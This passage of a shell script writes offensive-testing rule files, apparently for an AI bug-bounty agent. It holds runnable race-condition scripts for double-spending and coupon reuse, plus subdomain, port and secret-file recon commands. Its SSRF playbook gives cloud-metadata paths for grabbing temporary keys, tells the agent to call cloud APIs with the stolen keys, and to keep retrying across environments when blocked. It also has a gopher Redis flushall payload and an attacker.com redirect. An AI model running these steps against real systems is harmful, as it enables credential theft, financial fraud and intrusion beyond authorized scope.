                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Header requirement** (unique per queued copy for log correlation; Turbo Intruder payload placeholder):

```http
x-request: %s
```

Turbo Intruder replaces `%s` per request when paired with a wordlist (or other payload source) — keep this header on the **base request** in Repeater before sending to Turbo Intruder. Case-insensitive for HTTP; use a consistent name for log grep.

### 5.2 Template 2 — Multi-endpoint, same gate

**Pattern**: One **POST** to **target-1** (state change) plus **many GETs** to **target-2** (read side) released together to widen the TOCTOU window observation.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    engine.queue(post_to_target1, gate='race1')
    for _ in range(30):
        engine.queue(get_target2, gate='race1')

    engine.openGate('race1')
```

Adjust hosts/paths by duplicating `RequestEngine` instances if endpoints differ (Turbo Intruder supports multiple engines — consult upstream docs for your Burp version).

---

## 6. CVE REFERENCE — CVE-2022-4037

**CVE-2022-4037** (GitLab CE/EE): race condition leading to **verified email address forgery** and risk when the product acts as an **OAuth identity provider** — third-party account linkage/impact scenarios. **CWE-362**. Demonstrated in public research with **HTTP/2 single-packet** style timing to win narrow windows.

**Takeaway for testers**: email verification, OAuth linking, and "confirm ownership" flows are high-value race targets — not only coupons and balances.

**References (official / neutral)**:

- [NVD — CVE-2022-4037](https://nvd.nist.gov/vuln/detail/CVE-2022-4037)
- GitLab security advisories and vendor CVE JSON for affected version ranges

---

## 7. TOOLS

| Tool | Role |
|------|------|
| [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) | High-concurrency replay, **gates**, scripting in Burp. |
| [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) | Race-focused HTTP client patterns (verify compatibility with your stack). |
| [nxenon/h2spacex](https://github.com/nxenon/h2spacex) | HTTP/2 low-level / single-packet style experimentation (use responsibly, authorized targets only). |
| **Burp Suite — Repeater** | **Send group (parallel)** / **single-packet attack** for multi-request synchronization. |

---

## 8. DECISION TREE

```text
                         START: state-changing API?
                                    |
                     NO -----------+---------- YES
                      |                        |
                   stop here              one-time / balance / verify?
                                                    |
                          +-------------------------+-------------------------+
                          |                         |                         |
                    coupon-like                 rate limit                  multi-step
                          |                         |                         |
                   parallel same req          parallel vs serial         parallel pipelines
                          |                         |                         |
                   duplicate success?           limit exceeded?          state mismatch?
                     /       \                    /       \                  /       \
                   YES       NO                 YES       NO               YES       NO
                    |         |                  |         |                |         |
              report +    try HTTP/2        report +    try TI        report +   deepen
              evidence    single-packet      evidence    gates                     per-step
                    |         |                  |         |                |         |
                    +----+----+                  +----+----+                +----+----+
                         |                            |                          |
                    tool pick                    tool pick                  tool pick
                         v                            v                          v
              Burp group / h2spacex            TI gates / Raceocat          TI + trace IDs
```

**How to confirm (evidence checklist)**:

1. **Reproducible** duplicate success under parallelism, not flaky single retries.
2. **Server-side** artifact: two rows, two emails, two grants, or wrong final balance.
3. **Correlate** with `x-request` (or similar) markers or unique body fields in logs (authorized environments).

**Routing summary**: if the scenario is more about business rules, pricing, or workflow bypass, load `logic-test.md`; this file focuses on **concurrency and transport-layer synchronization**.

---

## 9. HTTP/2 SINGLE-PACKET ATTACK — DETAILED MECHANICS

### 9.1 TCP Nagle Algorithm & Frame Coalescing

TCP's Nagle algorithm (RFC 896) buffers small writes and coalesces them into fewer, larger segments. When an HTTP/2 client writes multiple HEADERS+DATA frames in rapid succession **without flushing between them**, the kernel merges them into a single TCP segment (up to MSS, typically ~1460 bytes on Ethernet).

```text
Application layer:   [Stream 1 H+D] [Stream 3 H+D] [Stream 5 H+D]
                            ↓ TCP Nagle coalescing ↓
TCP segment:         [Stream 1 H+D | Stream 3 H+D | Stream 5 H+D]  ← one packet on the wire
```

- `TCP_NODELAY` **disabled** (default) → Nagle active → coalescing happens naturally
- If `TCP_NODELAY` is set, the client must use `writev()` / gather-write syscall to batch frames
- Practical limit: ~20–30 small requests per 1460-byte MSS; exceeding this splits across packets and degrades synchronization

### 9.2 Server-Side Request Queue Processing

```text
NIC IRQ → kernel recv buffer → HTTP/2 demuxer → concurrent dispatch

  ┌─ Stream 1 → worker thread A ─┐
  ├─ Stream 3 → worker thread B ─┤  sub-microsecond spacing
  └─ Stream 5 → worker thread C ─┘
```

1. Single `recv()` syscall returns the entire segment
2. HTTP/2 frame parser demultiplexes streams from same segment
3. Dispatcher fans out to application worker pool

First-to-last request dispatch gap: **< 100 μs** on modern servers — orders of magnitude tighter than HTTP/1.1 last-byte sync (~1–5 ms network jitter).

### 9.3 HTTP/2 vs HTTP/1.1 Last-Byte Comparison

| Factor | HTTP/2 Single-Packet | HTTP/1.1 Last-Byte |
|--------|---------------------|-------------------|
| Connections needed | 1 | N (one per request) |
| Wire synchronization | Same TCP segment | N segments released "simultaneously" |
| Network jitter impact | Zero (same packet) | Each connection has independent RTT |
| Server dispatch gap | < 100 μs | 1–5 ms typical |
| Practical limit | ~20–30 requests per MTU | Limited by connection setup |

### 9.4 Practical Execution with h2spacex

```python
import h2spacex

h2_conn = h2spacex.H2OnTCPSocket(
    hostname='target.example.com',
    port_number=443
)

headers_list = []
for i in range(20):
    headers_list.append([
        (':method', 'POST'),
        (':path', '/api/v1/rewards/claim'),
        (':authority', 'target.example.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
        ('authorization', 'Bearer TOKEN'),
    ])

h2_conn.setup_connection()
h2_conn.send_ping_frame()
h2_conn.send_multiple_requests_at_once(
    headers_list,
    body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
)
responses = h2_conn.read_multiple_responses()
```

---

## 10. DATABASE ISOLATION LEVEL EXPLOITATION MATRIX

| Isolation Level | Phenomenon Exploited | Attack Window | Typical Vulnerable Pattern |
|----------------|---------------------|---------------|---------------------------|
| **READ UNCOMMITTED** | Dirty reads | Thread B reads Thread A's uncommitted write | `SELECT balance` sees in-flight deduction, proceeds with stale logic |
| **READ COMMITTED** | Non-repeatable reads (TOCTOU) | Both threads read committed balance, both pass check, both deduct | `SELECT` → app check → `UPDATE` without `FOR UPDATE` |
| **REPEATABLE READ** | Phantom reads | Snapshot isolation hides concurrent inserts; both threads see "0 claims" and insert | `INSERT IF NOT EXISTS` pattern without UNIQUE constraint |
| **SERIALIZABLE** | Advisory lock bypass | Application uses `pg_advisory_lock()` / `GET_LOCK()` with wrong scope or derivable key | Lock key from user input; session-vs-transaction scope mismatch |

### READ COMMITTED TOCTOU (most common in production)

```sql
-- Thread A                            -- Thread B
SELECT balance FROM accounts           SELECT balance FROM accounts
  WHERE id=1;  -- returns 100            WHERE id=1;  -- returns 100
-- app: 100 >= 100 ✓                   -- app: 100 >= 100 ✓
UPDATE accounts SET balance =          UPDATE accounts SET balance =
  balance - 100 WHERE id=1;             balance - 100 WHERE id=1;
COMMIT; -- balance = 0                 COMMIT; -- balance = -100 ← double-spend
```

**Fix verification**: `SELECT ... FOR UPDATE` should block Thread B's SELECT until Thread A commits.

### REPEATABLE READ Phantom Insert

```sql
-- Thread A (snapshot at T0)           -- Thread B (snapshot at T0)
SELECT count(*) FROM claims            SELECT count(*) FROM claims
  WHERE user_id=1 AND coupon='X';        WHERE user_id=1 AND coupon='X';
-- returns 0 (snapshot)                -- returns 0 (snapshot)
INSERT INTO claims ...;                INSERT INTO claims ...;
COMMIT; -- succeeds                    COMMIT; -- succeeds ← duplicate claim
```

**Fix**: `UNIQUE(user_id, coupon_id)` constraint causes one INSERT to fail with duplicate key error regardless of isolation level.

### SERIALIZABLE Advisory Lock Bypass

```sql
-- Application intends: one lock per coupon
SELECT pg_advisory_lock(hashtext('coupon_' || $coupon_id));
-- Bypass vectors:
--   1. Lock is session-scoped but transaction rolls back → lock persists, next txn skips
--   2. Different code path reaches claim logic without acquiring the lock
--   3. Attacker triggers claim via alternative API endpoint that lacks locking
```

### Quick Audit Checklist

```text
□ SHOW TRANSACTION ISOLATION LEVEL — what level is the database running?
□ Does the hot path use SELECT ... FOR UPDATE or explicit row locks?
□ Is the check-then-act sequence inside a single transaction?
□ Are UNIQUE constraints enforced on the critical state table?
□ Multi-instance deployment: is there a distributed lock (Redis SETNX / Zookeeper)?
```

---

## 11. LIMIT-OVERRUN ATTACK PATTERNS

### 11.1 Coupon / Promo Code Reuse

```text
Target:   POST /api/apply-coupon {"code":"SUMMER50"}
Expected: One use per user
Attack:   20 parallel identical requests
Evidence: Multiple 200 responses, final order total = N × discount applied
```

Variations: same coupon across different cart items; apply-coupon + checkout in parallel (coupon consumed only at checkout).

### 11.2 Vote / Rating Manipulation

```text
Target:   POST /api/vote {"post_id":123,"direction":"up"}
Expected: One vote per user per post
Attack:   50 parallel vote requests
Evidence: Vote count += N, or DB shows multiple vote rows for same user+post
```

### 11.3 Balance Double-Spend

```text
Target:   POST /api/transfer {"to":"attacker","amount":100}
Balance:  Exactly 100
Attack:   2+ parallel transfers
Evidence: Both succeed, sender balance goes negative, recipient receives 200
```

Higher-value variant: withdrawal to external system (crypto, bank wire) where reversal is difficult.

### 11.4 Inventory Oversell

```text
Target:   POST /api/purchase {"item_id":"limited_edition","qty":1}
Stock:    1 remaining
Attack:   20 parallel purchase requests
Evidence: Multiple orders created, stock counter goes negative
```

Compound attack: add-to-cart and checkout are separate steps, each checking inventory independently.

### 11.5 Referral / Signup Bonus

```text
Target:   POST /api/referral/claim {"code":"REF_ABC"}
Expected: One claim per referred user
Attack:   Parallel claims from same session
Evidence: Bonus credited to referrer multiple times
```

---

## 12. SINGLE-PACKET MULTI-ENDPOINT ATTACK

Instead of N copies of the same request, send requests to **different endpoints** in one HTTP/2 single-packet burst. This widens the TOCTOU window by hitting both the check and use paths simultaneously.

### Pattern 1: State-check + State-mutate

```text
Single TCP segment:
  Stream 1: GET  /api/balance       ← probe pre-state
  Stream 3: POST /api/transfer      ← mutate
  Stream 5: POST /api/transfer      ← mutate (duplicate)
  Stream 7: GET  /api/balance       ← probe post-state
```

Balance inconsistency between stream 1 and stream 7 confirms the race window was hit.

### Pattern 2: Cross-resource race

```text
Single TCP segment:
  Stream 1: POST /api/coupon/apply   ← apply discount
  Stream 3: POST /api/order/checkout ← finalize order
```

If coupon application and checkout check prices independently, the discount may apply after checkout has locked the price.

### Pattern 3: Auth verification + Privileged action

```text
Single TCP segment:
  Stream 1: POST /api/email/verify?token=TOKEN  ← verify email
  Stream 3: POST /api/account/upgrade            ← requires verified email
```

Upgrade may succeed during the brief window where verification is processing but not yet committed.

### Practical setup

Burp Repeater: add requests targeting **different paths** to the same group → "Send group (single packet)".

```python
headers_balance = [(':method','GET'), (':path','/api/balance'), ...]
headers_transfer = [(':method','POST'), (':path','/api/transfer'), ...]

all_headers = [headers_balance] + [headers_transfer]*5 + [headers_balance]
all_bodies = [b''] + [b'{"to":"attacker","amount":100}']*5 + [b'']

h2_conn.send_multiple_requests_at_once(all_headers, body_list=all_bodies)
```

---

## Related

- **business-logic-vulnerabilities** — workflow, coupon abuse, and logic-first checklists (`logic-test.md`).
TECH_RACE_CONDITION_TEST_EOF

seed_rule techniques/recon-methodology.md <<'TECH_RECON_METHODOLOGY_EOF'
# recon-and-methodology

> **测绘节奏只认** `rules/srcskill/dig-scope-workflow.md` §1.0.1 / §2.1：只搜**当前这一个**种子；本种子剩余活面没挖完禁止新搜。认到短表形态只打当前站，禁止拿 Morph 去全网 FOFA。优质根域只回灌，本种子挖完才搜。
>
> **全量 nuclei 不当进度。** nuclei 只在需要已知 CVE / 暴露面（actuator、swagger、已知中间件）时辅助；禁止把「全量模板扫一遍」当本站矩阵。
>
> 调搜用 MCP `fofa`（`fofa__get_alerts`），不要自己 curl。Key 在 `~/.grok/config.toml` `[mcp_servers.fofa.env]`：主号 → backup → backup2，`fofa.py` 遇 429/820041 自动切。限流闸认 `rules/srcskill/dig-scope-workflow.md` §2.1.4。**禁止**把 email / key 写进本文件或对话。

### FOFA 最短语法（备忘，不是开场）

```
qbase64：查询语句 UTF-8 再 Base64
fields：host,ip,port,title,server
size：先小后翻；本种子结果可翻页，不是换种子

domain="target.com"
header="application/json"
body="actuator"
port="8080"
server="nginx" && domain="target.com"
cert.subject="品牌"
icon_hash="xxx"
status_code="200"
组合 && ；排除 !=
```

Quake / 凤鸟只补**当前种子**缺口，不当开场必跑。语法对照与 ROI 过滤见下文各节；过滤仍服从 `rules/srcskill/dig-scope-workflow.md` 去废 / 去非存活 / 股权闸。

# Recon and Methodology


## 1. RECON HIERARCHY

```
Target Selection
└── Scope Definition (in-scope assets)
    └── Asset Discovery (subdomains, IPs, domains)
        └── Tech Fingerprinting (what's running)
            └── Endpoint Discovery (attack surface)
                └── Vulnerability Testing (per vulnerability type)
```

---

## 2. SUBDOMAIN ENUMERATION (CRITICAL FIRST STEP)

### Passive (no DNS queries to target)
```bash
# Subfinder (aggregates multiple sources):
subfinder -d target.com -o subdomains.txt

# Amass passive:
amass enum -passive -d target.com

# Certsh (certificate transparency):
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# SecurityTrails API, Shodan:
# Web: https://securitytrails.com/list/apex_domain/target.com
```

### Active (DNS brute force + resolution)
```bash
# Massdns + wordlist:
massdns -r /path/to/resolvers.txt -t A -o S -w output.txt \
  <(cat wordlist.txt | sed 's/$/.target.com/')

# ffuf for subdomain brute:
ffuf -w subdomains-wordlist.txt -u https://FUZZ.target.com \
  -mc 200,301,302,403 -H "Host: FUZZ.target.com"

# DNSx for bulk resolution:
cat subdomains.txt | dnsx -a -resp -o resolved.txt

# Recommended wordlist: SecLists/Discovery/DNS/
```

### Virtual Host Discovery
```bash
# ffuf vhost mode:
ffuf -w wordlist.txt -u https://target.com \
  -H "Host: FUZZ.target.com" -mc 200,301,403

# gobuster vhost:
gobuster vhost -u https://target.com -w wordlist.txt
```

---

## 3. SERVICE AND PORT DISCOVERY

```bash
# Fast port scan (common ports):
nmap -T4 -F target.com -oN ports.txt

# Comprehensive scan on resolved subdomains:
cat resolved_ips.txt | nmap -iL - --open -p 80,443,8080,8443,8888,3000,5000 -oG scan.txt

# httpx for HTTP probing:
cat subdomains.txt | httpx -title -tech-detect -status-code -o live_hosts.txt

# masscan for speed on large IP ranges:
masscan -p 80,443,8080,8443 10.0.0.0/8 --rate=1000
```

---

## 4. WEB TECHNOLOGY FINGERPRINTING

```bash
# Wappalyzer (browser extension) or:
whatweb https://target.com

# httpx with tech detection:
httpx -u https://target.com -tech-detect

# Check headers manually:
curl -sI https://target.com | grep -i "server\|x-powered-by\|x-generator\|cf-ray"

# Fingerprint from:
- Server header: nginx/1.18, Apache/2.4, IIS/10.0
- X-Powered-By: PHP/7.4, ASP.NET
- Cookies: PHPSESSID (PHP), JSESSIONID (Java), _rails_session (Rails)
- HTML comments: <!-- Drupal 9 -->
- Meta generator: <meta name="generator" content="WordPress 6.2">
- JS framework files: /static/js/angular.min.js
```

---

## 5. ENDPOINT DISCOVERY

### Directory Brute Force
```bash
# ffuf (fastest):
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -mc 200,301,302,403 -t 50 -o dirs.txt

# Gobuster:
gobuster dir -u https://target.com -w wordlist.txt -x php,html,js,json

# feroxbuster (recursive):
feroxbuster -u https://target.com -w wordlist.txt -x php,html,txt -r
```

### Parameter Discovery
```bash
# Arjun (hidden parameter finder):
arjun -u https://target.com/api/endpoint

# x8:
x8 -u https://target.com/api/endpoint -w params-wordlist.txt
```

### JavaScript Source Mining
```bash
# Extract endpoints from JS files:
gau target.com | grep '\.js$' | httpx -mc 200 | xargs -I{} curl -s {} | \
  grep -oE '"/[a-zA-Z0-9/_-]+"' | sort -u

# LinkFinder:
python3 linkfinder.py -i https://target.com -d -o output.html

# GetAllURLs (gau):
gau target.com | sort -u > all_urls.txt

# Wayback URLs:
waybackurls target.com | sort -u > wayback_urls.txt
```

### API Endpoint Discovery
```bash
# Common API paths:
ffuf -u https://target.com/FUZZ -w /SecLists/Discovery/Web-Content/api/api-endpoints.txt

# Swagger/OpenAPI:
test: /swagger.json /api-docs /openapi.json /v2/api-docs /.well-known/ /docs/

# GraphQL:
test: /graphql /gql /v1/graphql /api/graphql
```

---

## 6. SOURCE CODE RECON

### GitHub / GitLab Exposure
```bash
# trufflehog (secret scanner in git history):
trufflehog git https://github.com/target-org/target-repo

# gitleaks:
gitleaks detect --source /path/to/cloned/repo

# Manual GitHub search:
# site:github.com "target.com" "api_key" OR "secret" OR "password"
# site:github.com "target.com" ".env" OR "config.php" OR "db_password"

# GitHub dorks:
# "target.com" extension:env
# "target.com" filename:*.config password
# org:target-org secret OR password OR apikey
```

### Exposed Environment Files
```
# Check common paths:
https://target.com/.env
https://target.com/.git/config
https://target.com/config.json
https://target.com/config.yaml
https://target.com/credentials.json
https://target.com/secrets.json
https://target.com/wp-config.php
https://target.com/backup.sql
https://target.com/backup.zip
```

---

## 7. ZSEANO'S TESTING METHODOLOGY

> **节奏不听本节。** 自由跳 / 一种子 / 力气先砸哪认 `rules/srcskill/dig-scope-workflow.md` + `src-value` §1.1。本节只当：参数怎么想、错误页/旧版本/移动端 API 别漏。命令和思路仍用。

### Core Philosophy
1. **Go deep on one program** rather than spread across many — learn the application thoroughly
2. **Build a profile of the company** — tech stack, developers, processes
3. **Look where others don't** — check error pages, admin paths, old versions, mobile API
4. **Follow the filter** — if input is filtered somewhere, that functionality exists and may be bypassed

### Testing Sequence (One Page / Feature)
```
For each input point:
1. Non-malicious HTML tags (<h2>, <img>) → are they reflected?
2. Incomplete tags → what happens? (<iframe src=//evil.com )
3. Encoding tests → %0d, %0a, %09, <%00
4. Observe the OUTPUT too (not just response) — where does your input appear?
5. Test same input in ALL similarly-structured pages (shared code → shared vuln)
6. Check if the same parameter exists in mobile/API endpoint (less protected)
```

### Parameter Insights
```
- Each parameter tells a story: "what does this do server-side?"
- Filename → OS interaction → Path Traversal / CMDi
- URL/location → HTTP fetch → SSRF
- Template/HTML parameter → render function → SSTI
- XML field → parser → XXE
- SQL filter → query → SQLi
- User-content → storage → Stored XSS
```

---

## 8. BUG BOUNTY PROGRAM TRIAGE (WHERE TO SPEND TIME)

> **节奏不听本节。** 自由跳种子/换站认 `rules/srcskill/dig-scope-workflow.md`；力气先砸哪认 `src-value` §1.1。下面 Priority 不是第二套测绘，也不是 SRC 定级。命令和参数思路仍用。

### High-Value Target Selection
```
✓ Programs with large scope (*.target.com)
✓ Programs that pay for P2/P3 (not just RCE)
✓ Programs with recent tech changes (migrations = new bugs)
✓ Programs with active development (new features = new attack surface)
× Avoid: frozen/old codebases with well-known CVEs (already claimed)
× Avoid: strict programs with narrow scope (less surface)
```

### High-Value Feature Focus (by bug probability)
```
Priority 1: Authentication, password reset, 2FA → account takeover
Priority 2: File upload, profile edit, API endpoints → stored XSS, IDOR
Priority 3: Admin panels, user management → BFLA, privilege escalation
Priority 4: Payment flows, subscription → business logic
Priority 5: Import/export, template rendering → XXE, SSTI
```

---

## 9. NUCLEI TEMPLATES (AUTOMATED SCANNING)

全量模板扫一遍不当进度。只在已知 CVE / 暴露面需要时收窄模板。

```bash
# 收窄：已知 CVE / 暴露面，不要当开场全量
nuclei -u https://target.com -t cves/ -severity critical,high
nuclei -u https://target.com -t exposures/
nuclei -u https://target.com -t misconfiguration/

# On subdomain list:
cat subdomains.txt | nuclei -t exposures/ -t misconfiguration/ -o exposed.txt
```

---

## 10. COMMON MISCONFIGURATIONS (QUICK WINS)

```
□ CORS: SRC 永久跳过（不挖不写；见 cors-vuln-report-priority）— 勿当 quick win
□ S3 bucket public: curl https://target.s3.amazonaws.com/
□ Directory listing: response contains "Index of /"
□ .git exposed: curl https://target.com/.git/config
□ .env exposed: curl https://target.com/.env
□ Debug mode: stack traces in production (source code exposure)
□ Default credentials: admin:admin, admin:password on admin panels
□ phpinfo.php: curl https://target.com/phpinfo.php
□ Backup files: config.bak, database.sql.gz, app.zip
□ GraphQL introspection enabled: POST /graphql {"query":"{__schema{types{name}}}"}
□ Admin panels: /admin /manager /console /phpmyadmin /wp-admin
```

---

## 11. QUICK REFERENCE TOOLS

| Category | Tool |
|---|---|
| Subdomain enum | subfinder, amass, massdns |
| Port scan | nmap, masscan |
| HTTP probe | httpx |
| Dir brute | ffuf, feroxbuster, gobuster |
| JS mining | LinkFinder, gau, waybackurls |
| Secret scan | trufflehog, gitleaks |
| Parameter fuzz | arjun, x8 |
| Vuln scan | nuclei |
| Proxy/intercept | Burp Suite Pro |
| JWT attacks | jwt_tool |
| SQLi | sqlmap |
| XSS | dalfox, XSStrike |
| SSRF | SSRFmap, Gopherus |

---

## 12. JAVA MIDDLEWARE FINGERPRINT MATRIX

| Middleware | Detection Path | Key Indicators |
|---|---|---|
| Apache Tomcat | `/manager/html`, `/manager/status` | Default creds: `tomcat:tomcat`, `admin:admin` |
| JBoss / WildFly | `/jmx-console/`, `/web-console/` | JMX MBean access, WAR deployment |
| WebLogic | `/console/`, `/wls-wsat/` | T3 protocol on 7001/7002, IIOP |
| Spring Boot Actuator | `/actuator/`, `/actuator/env`, `/actuator/heapdump` | JSON endpoint listing, heap dump contains secrets |
| Spring Boot (alt paths) | `/actuator/jolokia`, `/actuator/gateway/routes` | Jolokia JMX bridge, Gateway route injection |
| Jenkins | `/script`, `/manage` | Groovy console, API token in cookie |
| GlassFish | `/common/`, `/theme/` | Admin on 4848, default empty password |
| Jetty | `/jolokia/` | JMX access |
| Resin | `/resin-admin/` | Admin panel |

### Spring Boot Actuator Exploitation Priority

```
/actuator/env          → Leak environment variables (DB creds, API keys)
/actuator/heapdump     → Download JVM heap → search for passwords in memory
/actuator/jolokia      → JMX → possible RCE via MBean manipulation
/actuator/gateway/routes → Spring Cloud Gateway → SpEL injection (CVE-2022-22947)
/actuator/configprops  → All configuration properties
/actuator/mappings     → All URL mappings (hidden endpoints)
/actuator/beans        → All Spring beans
/actuator/shutdown     → POST to shutdown application (DoS)
```

---

## 13. INFORMATION LEAK DETECTION CHECKLIST

### Version Control & Backup Leaks

```
/.git/HEAD                    → Git repository exposed
/.svn/entries                 → SVN metadata
/.svn/wc.db                   → SVN SQLite database
/.hg/requires                 → Mercurial
/.bzr/README                  → Bazaar
/.DS_Store                    → macOS directory listing
```

### Backup File Patterns

```
/backup.zip    /backup.tar.gz    /backup.sql
/wwwroot.rar   /www.zip          /web.zip
/db.sql        /database.sql     /dump.sql
/config.php.bak    /config.php~    /config.php.swp
/.config.php.swp   /wp-config.php.bak
/.env          /.env.bak         /.env.production
```

### API Documentation & Debug

```
/swagger-ui.html              → Swagger/OpenAPI
/swagger-ui/                  → Swagger UI
/api-docs                     → API documentation
/graphql                      → GraphQL playground
/graphiql                     → GraphQL IDE
/debug/                       → Debug endpoints
/phpinfo.php                  → PHP configuration
/server-status                → Apache status
/server-info                  → Apache info
/nginx_status                 → Nginx status
```

### Cloud & Infrastructure

```
/.aws/credentials             → AWS credentials
/.docker/config.json          → Docker registry auth
/robots.txt                   → Disallowed paths (hint list)
/sitemap.xml                  → Full URL listing
/crossdomain.xml              → Flash cross-domain policy
/.well-known/                 → Various well-known URIs
```
TECH_RECON_METHODOLOGY_EOF

seed_rule techniques/ssrf-test.md <<'TECH_SSRF_TEST_EOF'
> 短表「云厂商元数据路径差」「公开 GOPROXY」用标题搜。英文补充/附件已砍；云元数据路径差和绕过仍在上半。

## 一、原有知识库

# SSRF 测试手册

## 常见注入点

```
图片/文件URL参数: imageUrl=, fileUrl=, url=, link=, targetUrl=
预览/加载功能: preview=, fetch=, load=, callback=
Webhook: webhook_url=, notify_url=, redirect_url=
PDF/截图生成: 传入 URL 生成截图
模型/网关代理: path 带 proxy，参数仍是 targetUrl / url / callback
```

## 检测 Payload

### 使用 DNSLog 验证（无回显）

```bash
# 申请一个 dnslog 域名: dnslog.cn / ceye.io / interact.sh
DNSLOG="your-unique-id.dnslog.cn"

# 发送请求
curl "https://target.com/api/preview?url=http://$DNSLOG/test"

# 去 dnslog 平台查看是否有 DNS 查询记录
# 有记录 → SSRF 存在
```

### 内网探测（确认 SSRF 后）

```bash
# 探测内网常用 IP 段
for ip in 192.168.1.{1..254}; do
  echo "?url=http://$ip"
done

# 探测内网服务端口
?url=http://192.168.1.1:6379/   # Redis
?url=http://192.168.1.1:27017/  # MongoDB
?url=http://192.168.1.1:8080/   # 内网 Web
?url=http://192.168.1.1:22/     # SSH（通过响应时间判断）
```

### 云服务 Metadata（重点）

```bash
# AWS EC2 Metadata（严重危害，可获取 IAM 凭证）
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 国内云 ECS 元数据
?url=http://100.100.100.200/latest/meta-data/
?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/

# GCP Metadata
?url=http://metadata.google.internal/computeMetadata/v1/

# 云厂商（目录通了还要取钥匙，见下「云厂商元数据路径差」）
?url=http://厂商元数据域名/latest/meta-data/
?url=http://厂商元数据域名/latest/meta-data/cam/security-credentials/
?url=http://厂商元数据域名/latest/meta-data/cam/service-role-security-credentials/<ROLE>
?url=http://169.254.169.254/latest/meta-data/
```

### 云厂商元数据路径差 / 回环拦了元数据没拦 / 云开发匿名代理（短表有指针）

认：云厂商元数据；或云开发 / HTTP 网关 path 带 `proxy`，参数是 `targetUrl` / `url` / `callback`；有匿名登录（`signin/anonymously` 一类）就能拿到 token。

打：

1. **过滤对照。** 先打 `http://127.0.0.1/`，再打 `http://厂商元数据域名/latest/meta-data/` 和 `http://169.254.169.254/latest/meta-data/`。回环 403、`Forbidden Loopback` ≠ 元数据也拦了。只拦回环字符串、不按解析后的 IP 再拦云元数据域名，继续打。
2. **钥匙路径。** 目录通了先读角色名（`cam/security-credentials/` 下列表）。再取临时钥匙：`cam/security-credentials/角色名` 常 404，**必须再打** `cam/service-role-security-credentials/角色名`。按 AWS `iam/security-credentials/` 菜谱在 404 停手 = 漏钥匙。
3. **匿名网关当入口。** 官方演示环境、匿名登录拿到的 token，**不当「已经登录、权限内」**。带着它打 `*proxy*` 的 URL 参。别的环境同一接口可能禁掉，换环境继续试，不把一处禁掉当成全产品安全。
4. **固定 POST 的开放代理。** 直打元数据 405（IMDS 只吃 GET）≠ 没洞。先打公网 302（`redirect-to` 一类）把 Location 指到 `http://100.100.100.200/latest/meta-data/ram/security-credentials/角色`，让代理跟跳转时改成 GET。国内云角色列在 `ram/security-credentials/`。钥拿去 STS GetCallerIdentity。

算成：回显元数据正文，或拿到 `TmpSecretId` / `TmpSecretKey` / `Token`，再用这三样调云 API（`GetCallerIdentity` 一类）对上主账号。ListBuckets 403 别停，再签 CLS `DescribeConfigs` 看采集配置/主题。只读到 instance-id、钥匙 404 或调不通 → 还没成。

假点：代理只允许模型厂商白名单、元数据也 403；匿名开了但代理对匿名关死；钥匙是窄角色且没证明能调任何云 API（半条，别空喊接管全账号）。单站没中不删短表这行。

和通用「SSRF 打 `169.254.169.254`」不是重复：本条补的是 **厂商钥匙路径差 + 回环/元数据过滤分裂 + 匿名网关当入口**。公开 GOPROXY 不是本枪步骤，见下一节。

### 公开 GOPROXY（短表有指针）

认：公开 GOPROXY（`/go/`、模块 `/@v/list`）会按模块路径做 `?go-get=1` 再跟 VCS。**不是**上一节云开发 `*proxy*`。

打（不登录）：

1. 模块路径写成自己的域。  
2. 页上 `go-import` 用 **hg** + `http://厂商元数据域名/...`（git HTTPS 常超时）。  
3. RFC1918 Forbidden ≠ 元数据域名也拦。目录通了钥匙走 `cam/service-role-security-credentials/角色`（同上一节第 2 步）。

算成：hg 报错/回显出元数据或临时钥匙，再 GetCallerIdentity 问出 AccountId。

假点：不是 GOPROXY / 模块路径不会 `go-get`；元数据域名也被拦（不只 Forbidden RFC1918）；hg 也不跟且出不了钥；钥调不通。单站没中不删短表这行。

## 绕过技巧

```bash
# 绕过 IP 黑名单
http://127.0.0.1/    → http://2130706433/       # 十进制 IP
                     → http://0177.0.0.1/        # 八进制
                     → http://0x7f000001/         # 十六进制
                     → http://127.1/             # 简写

# 绕过 localhost 过滤
http://localhost/    → http://[::1]/             # IPv6
                     → http://127.0.0.1.xip.io/ # DNS 解析到 127

# 协议变换
http://internal-host/ → file:///etc/passwd
                      → gopher://127.0.0.1:6379/_*1...（打 Redis）
                      → dict://127.0.0.1:6379/info

# URL 重定向绕过
搭建重定向服务: http://attacker.com/redirect → 302 → http://169.254.169.254/
```

### COS 回源竞态（见了回源再打）

认：业务从 COS/OSS **取对象**，桶上配了「对象不存在则回源」到你能控的源；你还能对**同一 key** PUT 和 DELETE。没回源配置不要空打。

打：

1. 回源指到你的站，源上 302 到元数据或内网。  
2. 对同一 key 一边 PUT（检测时对象在，不回源）、一边 DELETE（真正 GET 时对象没了 → 回源跟 302）。并发见 `race-condition-test.md`。  
3. 看业务下载/导入是否打到你的源或内网。

算成：业务侧跟到内网/元数据（回显、带外或导入结果里有）。只证明回源能配、没打到内网 → 没成。

假点：回源不跟 302；检测和下载走同一时刻缓存；你控不了回源目标。不进短表（要自己能配回源，偏窄）。

## gopher 协议打内网服务

```bash
# 打 Redis（写 webshell 或计划任务）
# gopher://127.0.0.1:6379/_RESP编码的命令
?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

# 工具生成 gopher payload
# gopherus: python gopherus.py --exploit redis
```

---
TECH_SSRF_TEST_EOF

seed_rule techniques/subdomain-takeover-test.md <<'TECH_SUBDOMAIN_TAKEOVER_TEST_EOF'
# subdomain-takeover

# Subdomain Takeover — Detection & Exploitation Playbook


## 1. CORE CONCEPT

